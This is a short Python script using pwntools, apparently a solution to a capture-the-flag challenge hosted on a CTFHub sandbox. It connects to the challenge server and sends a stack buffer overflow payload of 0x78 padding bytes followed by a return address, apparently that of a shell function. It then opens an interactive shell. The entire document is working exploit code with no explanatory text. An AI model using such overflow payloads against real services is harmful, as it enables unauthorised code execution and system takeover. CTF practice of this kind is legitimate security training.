from pwn import *
p=remote('challenge-d158666bf8d3730c.sandbox.ctfhub.com',  29454)
shell_addr=0x4007B8
payloadp=b'A' *(0x70+0x8) + p64(shell_addr)
p.send(payloadp)
p.interactive()